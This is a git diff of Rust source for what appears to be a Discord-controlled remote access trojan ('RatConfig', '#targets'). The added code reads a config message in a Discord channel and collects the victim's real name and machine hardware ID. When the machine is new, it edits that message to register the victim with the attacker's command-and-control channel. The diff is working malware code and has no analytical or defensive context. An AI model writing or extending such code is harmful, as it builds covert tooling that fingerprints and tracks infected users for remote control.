@@ -13,7 +13,7 @@ use serenity::model::prelude::Message;
 use sysinfo::{System, SystemExt, User, UserExt};
 use machine_uid;
 use whoami::{hostname, realname};
-use serde_json::{from_str, Value, json};
+use serde_json::{Value, json};
 use serde::Serialize;
 use jsonformat::{Indentation, format};
 
@@ -114,18 +114,44 @@ impl RatConfig {
             .limit(10)
         ).await?;
 
-        let mut cfg_msg: Option<String> = None;
+        let mut cfg_msg = None;
+        let mut cfg_msg_content: Option<String> = None;
         for message in messages {
             if message.content.starts_with(IGNORE_MSG_PREFIX) { continue; }
-            if message.content.starts_with(CONFIG_MSG_PREFIX) { cfg_msg = Some(message.content.to_string()); }
+            if message.content.starts_with(CONFIG_MSG_PREFIX) {
+                cfg_msg_content = Some(message.content.to_string());
+                cfg_msg = Some(message);
+                break;
+            }
         }
 
         let hwid = machine_uid::get().expect("Couldn't get UUID");
-        if let Some(msg) = cfg_msg {
+        if let Some(msg) = cfg_msg_content {
             let targets = from_discord_json(msg);
-            let targets_json: Value = from_str(targets.as_str()).unwrap();
+            let mut targets_json: Value = serde_json::from_str(&targets.as_str()).unwrap();
 
-            // TODO
+            let mut found = false;
+            for (key, value) in targets_json.as_object().unwrap() {
+                if hwid == value.as_str().unwrap() {
+                    found = true;
+                }
+            }
+            // if new target, if current machine not found in [cfg] JSON in #targets
+            if found == false {
+                let mut json = targets_json.as_object_mut().unwrap();
+                json.insert(realname(), Value::String(hwid));
+                let new_targets_json: Value = json.to_owned().into();
+
+                let buf = Vec::new();
+                let formatter = serde_json::ser::PrettyFormatter::with_indent(b"\t");
+                let mut ser = serde_json::Serializer::with_formatter(buf, formatter);
+                new_targets_json.serialize(&mut ser).unwrap();
+                let string = String::from_utf8(ser.into_inner()).unwrap();
+
+                cfg_msg.unwrap().edit(&ctx.http, |m| m
+                    .content(to_discord_json(string))
+                ).await;
+            }
         } else {
             let default_msg = json!({ realname(): hwid });
 
